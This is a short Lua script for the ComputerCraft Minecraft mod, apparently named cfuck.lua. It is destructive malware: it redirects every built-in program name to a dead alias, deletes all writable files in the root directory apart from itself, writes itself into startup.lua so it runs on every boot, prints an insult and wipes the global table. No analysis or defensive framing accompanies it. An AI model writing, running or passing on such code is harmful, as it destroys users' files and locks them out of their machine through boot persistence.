local fllst = fs.list("/rom/programs/")
local mnfllst = fs.list("/")
for k,v in pairs(fllst) do
    local flnm = v:match("[^.]+")
    shell.setAlias(flnm, "/roms/programs/no.lua")
end
for k,v in pairs(mnfllst) do
    if v ~= "cfuck.lua" then
        if not fs.isReadOnly(v) then
            fs.delete("/"..v)
        end
    end
end
local strup = fs.open("/startup.lua","w")
local cfu = fs.open(shell.getRunningProgram(),"r")
strup.write(cfu.readAll())
strup.close()
cfu.close()
print("Fuck you :P")
_G._G = nil
